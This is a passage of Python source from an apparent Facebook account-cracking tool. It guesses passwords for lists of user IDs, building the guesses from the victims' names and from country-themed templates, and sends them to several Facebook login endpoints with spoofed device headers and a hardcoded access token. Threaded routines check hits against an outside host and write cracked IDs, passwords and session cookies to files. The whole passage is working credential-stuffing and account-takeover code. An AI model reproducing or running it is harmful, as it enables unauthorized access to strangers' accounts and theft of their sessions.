    	        if __METHODR__ == "1":___SEA___.submit(self.__M1XX__,ids,passlist)
    	        if __METHODR__ == "2":___SEA___.submit(self.__M2XX__,ids,passlist)
    	        if __METHODR__ == "3":___SEA___.submit(self.__M3XX__,ids,passlist)
    	        if __METHODR__ == "4":___SEA___.submit(self.__M4XX__,ids,passlist)
    	        if __METHODR__ == "5":___SEA___.submit(self.__M5XX__,ids,passlist)
    	        if __METHODR__ not in ["1","2","3","4","5"]:___SEA___.submit(self.__M1XX__,ids,passlist)
    	print("\033[1;37m");__LINE__();print(f"{xp} THE PROCESS HAS COMPLETED...!");print(f"{xp} TOTAL OK{G}/{W}NV{G}/{W}CP {xpxx}{B} "+str(len(self.oks))+f"{G}/{R}"+str(len(self.nvs))+f"{G}/{Y}"+str(len(self.cps)));__LINE__();print(f"{xp} THANKS FOR USING.....! ");sys.exit()
#----------------\<-RANDOM-M1-GRAPH->/----------------#
    def __M1XX__(self,ids,passlist):
    	global loop,oks,cps
    	color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	sys.stdout.write(f'\r{xp}{W}-{G}<[{B}{color}SEA-R1{G}]>{W}-{G}<[{color}{self.loop}{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{X}{len(self.nvs)}{G}/{R}{len(self.cps)}{G}]> ');sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {"adid":adid,"device_id":device_id,"family_device_id":str(uuid.uuid4()),"secure_family_device_id":str(uuid.uuid4()),"advertiser_id":str(uuid.uuid4()),"method":"POST","format":"json","email":ids,"password":pas,"cpl":"true","credentials_type":"password","generate_session_cookies":"1","error_detail_type":"button_with_disabled","generate_machine_id":"1","locale":"fo_FO","client_country_code":"FO","omit_response_on_success":"false","fb_api_req_friendly_name":"authenticate"}
                headers = {"Host": "graph.facebook.com","Authorization":f"OAuth {accessToken}","x-fb-connection-bandwidth": str(random.randint(20000, 40000)),"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"User-Agent": ___UPD___(),"x-fb-connection-quality": "POOR","x-fb-connection-type": "MOBILE.LTE","content-type": "app_authlication/x-www-form-urlencoded","x-fb-http-engine": "Liger","x-fb-client-IP": "True","x-fb-server-cluster": "Keep-Alive","Content-Type": "application/json"}
                url = "https://graph.facebook.com/auth/login"
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    uid = str(po["uid"])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if response == 'live':
                        print(f"\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} {uid} {G}/{B} {pas}")
                        print(f"\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;"+cookies);__LINE__()
                        open('/sdcard/SEA-XD/RANDOM/SEA-M1-OK.txt','a').write(uid+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+cookies+'\n')
                        self.oks.append(uid)
                        break
                    if response == 'dead':
                        print(f"\r{xp}{W}-{G}<[{A}SEA-LK{G}]>{A} {uid} {G}/{A} {pas}")
                        open('/sdcard/SEA-XD/RANDOM/SEA-M1-LK.txt','a').write(uid+'/'+pas+'\n')
                    if "-1:-1" in cookies:
                        print(f"\r{xp}{W}-{G}<[{X}SEA-NV{G}]>{X} {uid} {G}/{X} {pas}")
                        print(f"\r{xp}{W}-{G}<[{X}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;"+cookies);__LINE__()
                        open('/sdcard/SEA-XD/RANDOM/SEA-M1-NOVERY.txt', 'a').write(uid + '/' + pas + '\n')
                        self.nvs.append(uid)
                        break
                if 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f"\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} {uid} {G}/{R} {pas}")
                    open('/sdcard/SEA-XD/RANDOM/SEA-M1-CP.txt','a').write(uid+'/'+pas+'\n')
                    self.cps.append(uid)
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#----------------\<-RANDOM-M2-B-GRAPH->/----------------#
    def __M2XX__(self,ids,passlist):
    	global loop,oks,cps
    	color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	sys.stdout.write(f'\r{xp}{W}-{G}<[{B}{color}SEA-R2{G}]>{W}-{G}<[{color}{self.loop}{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{X}{len(self.nvs)}{G}/{R}{len(self.cps)}{G}]> ');sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {"adid":adid,"format":"json","device_id":device_id,"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids,"password":pas,"access_token":accessToken,"generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"de_DE","client_country_code":"DE","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                headers = {"User-Agent": ___UPD___(),"Content-Type": "application/x-www-form-urlencoded","Host": "b-graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000000, 30000000)),"X-FB-SIM-HNI": str(random.randint(20000000, 30000000)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=LVioZdhFijpO;pid=Main;tid=609;nc=1;fc=0;bc=0;cid=j4ZZ09qK34Gr27dYd885s0iho3b76s00","x-fb-device-group": "5120", "X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "2w7W20I0s0Hj8B48XaekgCn2325923PL"}
                url = "https://b-graph.facebook.com/auth/login"
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    uid = str(po["uid"])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if response == 'live':
                        print(f"\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} {uid} {G}/{B} {pas}")
                        print(f"\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;"+cookies);__LINE__()
                        open('/sdcard/SEA-XD/RANDOM/SEA-M2-OK.txt','a').write(uid+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+cookies+'\n')
                        self.oks.append(uid)
                        break
                    if response == 'dead':
                        print(f"\r{xp}{W}-{G}<[{A}SEA-LK{G}]>{A} {uid} {G}/{A} {pas}")
                        open('/sdcard/SEA-XD/RANDOM/SEA-M2-LK.txt','a').write(uid+'/'+pas+'\n')
                    if "-1:-1" in cookies:
                        print(f"\r{xp}{W}-{G}<[{X}SEA-NV{G}]>{X} {uid} {G}/{X} {pas}")
                        print(f"\r{xp}{W}-{G}<[{X}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;"+cookies);__LINE__()
                        open('/sdcard/SEA-XD/RANDOM/SEA-M2-NOVERY.txt', 'a').write(uid + '/' + pas + '\n')
                        self.nvs.append(uid)
                        break
                if 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f"\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} {uid} {G}/{R} {pas}")
                    open('/sdcard/SEA-XD/RANDOM/SEA-M2-CP.txt','a').write(uid+'/'+pas+'\n')
                    self.cps.append(uid)
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#----------------\<-RANDOM-M3-API->/----------------#
    def __M3XX__(self,ids,passlist):
    	global loop,oks,cps
    	color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	sys.stdout.write(f'\r{xp}{W}-{G}<[{B}{color}SEA-R3{G}]>{W}-{G}<[{color}{self.loop}{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{X}{len(self.nvs)}{G}/{R}{len(self.cps)}{G}]> ');sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {"adid":adid,"email":ids,"password":pas,"cpl":"true","credentials_type":"device_based_login_password","source":"login","error_detail_type":"button_with_disabled","format":"json","generate_session_cookies":"1","generate_analytics_claim":"1","generate_machine_id":"1","locale":"pt_BR","client_country_code":"BR","device":"","device_id":device_id,"method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler"}
                headers = {"content-type": "application/x-www-form-urlencoded","x-fb-sim-hni": str(random.randint(20000000, 30000000)),"x-fb-connection-type": "MOBILE.LTE","Authorization": f"OAuth {accessToken}","user-agent": ___UPD___(),"x-fb-net-hni": str(random.randint(20000000, 30000000)),"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-connection-quality": "MODERATE","x-fb-friendly-name": "authenticate","accept-encoding": "gzip, deflate","x-fb-http-engine": "Liger"}
                url = "https://api.facebook.com/method/auth.login"
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    uid = str(po["uid"])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if response == 'live':
                        print(f"\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} {uid} {G}/{B} {pas}")
                        print(f"\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;"+cookies);__LINE__()
                        open('/sdcard/SEA-XD/RANDOM/SEA-M3-OK.txt','a').write(uid+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+cookies+'\n')
                        self.oks.append(uid)
                        break
                    if response == 'dead':
                        print(f"\r{xp}{W}-{G}<[{A}SEA-LK{G}]>{A} {uid} {G}/{A} {pas}")
                        open('/sdcard/SEA-XD/RANDOM/SEA-M3-LK.txt','a').write(uid+'/'+pas+'\n')
                    if "-1:-1" in cookies:
                        print(f"\r{xp}{W}-{G}<[{X}SEA-NV{G}]>{X} {uid} {G}/{X} {pas}")
                        print(f"\r{xp}{W}-{G}<[{X}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;"+cookies);__LINE__()
                        open('/sdcard/SEA-XD/RANDOM/SEA-M3-NOVERY.txt', 'a').write(uid + '/' + pas + '\n')
                        self.nvs.append(uid)
                        break
                if 'www.facebook.com' in po['error_msg']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f"\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} {uid} {G}/{R} {pas}")
                    open('/sdcard/SEA-XD/RANDOM/SEA-M3-CP.txt','a').write(uid+'/'+pas+'\n')
                    self.cps.append(uid)
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#----------------\<-RANDOM-M4-B-API->/----------------#
    def __M4XX__(self,ids,passlist):
    	global loop,oks,cps
    	color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	sys.stdout.write(f'\r{xp}{W}-{G}<[{B}{color}SEA-R4{G}]>{W}-{G}<[{color}{self.loop}{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{X}{len(self.nvs)}{G}/{R}{len(self.cps)}{G}]> ');sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {"adid":adid,"format":"json","device_id":device_id,"email":ids,"password":pas,"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"logged_out_id": str(uuid.uuid4()),"hash_id": str(uuid.uuid4()),"sim_country": "id","network_country": "id","enroll_misauth": "false","generate_analytics_claims":"1","credentials_type":"password","source":"login","error_detail_type":"button_with_disabled","enroll_misauth":"false","cpl": "true","generate_session_cookies":"1","generate_machine_id":"1","meta_inf_fbmeta":"","currently_logged_in_userid":"0","fb_api_req_friendly_name":"authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                headers = {"Authorization":f"OAuth {accessToken}","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(900000, 999999)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Friendly-Name":"authenticate","X-FB-Connection-Type":"unknown","User-Agent":___UPD___(),"Accept-Encoding":"gzip, deflate","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger"}
                url = "https://b-api.facebook.com/method/auth.login"
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    uid = str(po["uid"])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if response == 'live':
                        print(f"\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} {uid} {G}/{B} {pas}")
                        print(f"\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;"+cookies);__LINE__()
                        open('/sdcard/SEA-XD/RANDOM/SEA-M4-OK.txt','a').write(uid+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+cookies+'\n')
                        self.oks.append(uid)
                        break
                    if response == 'dead':
                        print(f"\r{xp}{W}-{G}<[{A}SEA-LK{G}]>{A} {uid} {G}/{A} {pas}")
                        open('/sdcard/SEA-XD/RANDOM/SEA-M4-LK.txt','a').write(uid+'/'+pas+'\n')
                    if "-1:-1" in cookies:
                        print(f"\r{xp}{W}-{G}<[{X}SEA-NV{G}]>{X} {uid} {G}/{X} {pas}")
                        print(f"\r{xp}{W}-{G}<[{X}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;"+cookies);__LINE__()
                        open('/sdcard/SEA-XD/RANDOM/SEA-M4-NOVERY.txt', 'a').write(uid + '/' + pas + '\n')
                        self.nvs.append(uid)
                        break
                if 'www.facebook.com' in po['error_msg']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f"\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} {uid} {G}/{R} {pas}")
                    open('/sdcard/SEA-XD/RANDOM/SEA-M4-CP.txt','a').write(uid+'/'+pas+'\n')
                    self.cps.append(uid)
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#----------------\<-RANDOM-M5-HOST->/----------------#
#----------------\<-FILE-MENU->/----------------#
    def __FILE__(self):
    	__CLEAR__();print(f"{xp1} FRESH FILE ");print(f"{xp2} CP FILE ");print(f"{xp0} BACK MENU ");__LINE__();__FILEC__ = input(f"{xpx} INPUT FILE {xpxx} ")
    	if __FILEC__ == "1":self.__FILEX__()
    	if __FILEC__ == "2":self.__FILEX__()
    	if __FILEC__ == "0":self.__MENU__()
    	if __FILEC__ not in ["1","2","0"]:__LINE__();print(f"{xp} INVALID OPTION TRY AGAIN ");time.sleep(1);self.__FILE__()
#----------------\<-FILE-MENU->/----------------#
    def __FILEX__(self):
    	__CLEAR__();print(f"{xp} EXAMPLE  {xpxx} /sdcard/SEA.txt OR SEA.txt");__LINE__();__fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
    	try:
    	    if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):__fileXX__ = f"/sdcard/{__fileloX__}"
    	    else:__fileXX__ = __fileloX__
    	    __fileckX__ = open(__fileXX__,'r').read().splitlines()
    	except FileNotFoundError:__LINE__();print(f"{xp} FILE NOT FOUND TRY AGAIN ");time.sleep(1.2);self.__FILEX__()
    	__CLEAR__();print(f"{xp1} METHOD {G}<[{W}1{G}]>{W}");print(f"{xp2} METHOD {G}<[{W}2{G}]>{W}");print(f"{xp3} METHOD {G}<[{W}3{G}]>{W}");print(f"{xp4} METHOD {G}<[{W}4{G}]>{W}");print(f"{xp5} METHOD {G}<[{W}5{G}]>{W}");__LINE__();__METHODF__ = input(f"{xpx} INPUT METHOD {xpxx} ")
    	__CLEAR__();print(f"{xp1} AUTO BANGLADESH PASSLIST ");print(f"{xp2} AUTO PAKISTAN PASSLIST ");print(f"{xp3} AUTO INDIA PASSLIST ");print(f"{xp4} AUTO NEPAL PASSLIST ");print(f"{xp5} CUSTOM PASSLIST ");__LINE__();__PASLISTF__ = input(f"{xp} INPUT PASSLIST {xpxx} ")
    	if __PASLISTF__ == "1":self.plist.append("first2025");self.plist.append("first123");self.plist.append("first@12345");self.plist.append("000999");self.plist.append("@first@");self.plist.append("firstlast1234");self.plist.append("first321");self.plist.append("firstlast");self.plist.append("first");self.plist.append("first12");self.plist.append("firstlast123");self.plist.append("123412");self.plist.append("0987654");self.plist.append("@1234@");self.plist.append("09876543");self.plist.append("@@@@####");self.plist.append("@@@###");self.plist.append("@123456@");self.plist.append("@12345678@");self.plist.append("first4321")
    	if __PASLISTF__ == "2":self.plist.append("first123");self.plist.append("first@1234");self.plist.append("first@12345");self.plist.append("first786");self.plist.append("first110");self.plist.append("firstlast");self.plist.append("first last");self.plist.append("firstlast12");self.plist.append("firstlast123");self.plist.append("firstlast12345");self.plist.append("first@123");self.plist.append("last123");self.plist.append("last12345")
    	if __PASLISTF__ == "3":self.plist.append("firstlast");self.plist.append("first last");self.plist.append("first123");self.plist.append("57273200");self.plist.append("59039200");self.plist.append("234567");self.plist.append("708090");self.plist.append("first last");self.plist.append("firstlast123");self.plist.append("firstlast1234");self.plist.append("first123");self.plist.append("first2025");self.plist.append("first@");self.plist.append("first@@");self.plist.append("57273200")
    	if __PASLISTF__ == "4":self.plist.append("first1");self.plist.append("first12");self.plist.append("first123");self.plist.append("first123");self.plist.append("first1234");self.plist.append("first12345");self.plist.append("first@112");self.plist.append("first@123");self.plist.append("first@1234");self.plist.append("first@12345");self.plist.append("first last");self.plist.append("firstlast123");self.plist.append("firstlast12345")
    	if __PASLISTF__ not in ["1","2","3","4"]:
    	    try:__CLEAR__();print(f"{xp} BANGLADESH PASSLIST 10{G}/{W}15 LIMIT");print(f"{xp} OTHERS COUNTRY PASSLIST 5{G}/{W}10 LIMIT");__LINE__();__PASSFM__ = int(input(f"{xp} PASSLIST LIMIT {xpxx} "))
    	    except:__PASSFM__ = 5
    	    __CLEAR__();print(f"{xp} EXAMPLE  {xpxx} firstlast {G}/{W} first12 {G}/{W} first123 ");__LINE__()
    	    for i in range(__PASSFM__):self.plist.append(input(f"{xp} ENTER PASSLIST {G}<[{W}{i+1}{G}]> {xpxx} "))
    	__CLEAR__();print(f"{xp1} AUTO SPEED {G}<[{W}30{G}]> ");print(f"{xp2} CUSTOM SPEED ");__LINE__();__SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ")
    	if __SPEED__ == "1":__MAXX__ = 30
    	else:
    	    try:__CLEAR__();print(f"{xp} MAXIMUM SPEED LIMIT 30-60 ");__LINE__();__MAXX__ = int(input(f"{xpx} INPUT SPEED {xpxx} "))
    	    except ValueError:__MAXX__ = 60
    	__CLEAR__();print(f"{xp} DO YOU WANT TO SHOW COOKIE...? ");__LINE__();__co__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")
    	if __co__ in ['y', 'Y', 'yes', 'Yes', '1']:self.__COOKIE__.append('y')
    	else:self.__COOKIE__.append('n')
    	with ThreadPool(max_workers=__MAXX__) as __SEA__:
    	    __CLEAR__();total_ids = str(len(__fileckX__));print(f"{xp} TOTAL IDS {xpxx} {total_ids} ");print(f"{xp} IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE");__LINE__()
    	    for user in __fileckX__:
    	        ids,names = user.split('|');passlist = self.plist
    	        if __METHODF__ == "1":__SEA__.submit(self.__M1X__,ids,names,passlist)
    	        if __METHODF__ == "2":__SEA__.submit(self.__M2X__,ids,names,passlist)
    	        if __METHODF__ == "3":__SEA__.submit(self.__M3X__,ids,names,passlist)
    	        if __METHODF__ == "4":__SEA__.submit(self.__M4X__,ids,names,passlist)
    	        if __METHODF__ == "5":__SEA__.submit(self.__M5X__,ids,names,passlist)
    	        if __METHODF__ not in ["1","2","3","4","5"]:__SEA__.submit(self.__M1X__,ids,names,passlist)
    	print("\033[1;37m");__LINE__();print(f"{xp} THE PROCESS HAS COMPLETED...!");print(f"{xp} TOTAL OK{G}/{W}2F{G}/{W}CP {xpxx}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.twf))+f"{G}/{R}"+str(len(self.cps)));__LINE__();print(f"{xp} THANKS FOR USING.....! ");sys.exit()
#----------------\<-FILE-M1-GRAPH->/----------------#
    def __M1X__(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{G}<[{B}{color}SEA-F1{G}]>{W}-{G}<[{color}{self.loop}{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:ln = names.split(' ')[1]
            except:ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua = UserAgentGenerator().generate("ios")
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {"adid": adid,"format": "json","device_id": device_id,"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": f"{accessToken}","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {"User-Agent": ua,"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(11111, 99999)),"X-FB-SIM-HNI": str(random.randint(11111, 99999)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
                url = "https://graph.facebook.com/auth/login"
                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"]) 
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} '+ids+f'{W} / {B}'+pas+'\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;'+coki);__LINE__()
                    open('/sdcard/SEA-XD/FILE/SEA-M1-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                if twf in str(po):
                    print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} '+ids+f'{W} / {Y}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M1-2F.txt','a').write(ids+'/'+pas+'\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#----------------\<-FILE-M2-B-GRAPH->/----------------#
    def __M2X__(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{xp}{W}-{G}<[{B}{color}SEA-F2{G}]>{W}-{G}<[{color}{self.loop}{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:ln = names.split(' ')[1]
            except:ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua = UserAgentGenerator().generate("ios")
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                sexd = str(''.join(random_seed.choices(string.digits, k=20)))
                sim_serials = f'["{sexd}"]'
                data = {"adid":adid,"format":"json","device_id":device_id,"email":ids,"password":pas,"generate_analytics_claims":"1","community_id":"","sim_country": "id","try_num":"1","family_device_id":str(uuid.uuid4()),"sim_serials":sim_serials,"credentials_type":"password","source":"login","error_detail_type":"button_with_disabled","logged_out_id": str(uuid.uuid4()),"generate_session_cookies":"1","generate_machine_id":"1","tier": "regular","reg_instance": str(uuid.uuid4()),"meta_inf_fbmeta":"","currently_logged_in_userid":"0","locale":"en_US","client_country_code":"","fb_api_req_friendly_name":"authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                headers = {"Authorization":f"OAuth {accessToken}","X-FB-Friendly-Name":"authenticate","X-FB-Connection-Bandwidth":str(random.randint(11111, 99999)),"X-FB-Net-HNI": str(random.randint(11111, 99999)),"X-FB-SIM-HNI": str(random.randint(11111, 99999)),"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger"}
                url = "https://b-graph.facebook.com/auth/login"
                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"]) 
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} '+ids+f'{W} / {B}'+pas+'\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} sb=Cracked.By-NooR_Tool;'+coki);__LINE__()
                    open('/sdcard/SEA-XD/FILE/SEA-M2-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                if twf in str(po):
                    print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} '+ids+f'{W} / {Y}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M2-2F.txt','a').write(ids+'/'+pas+'\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
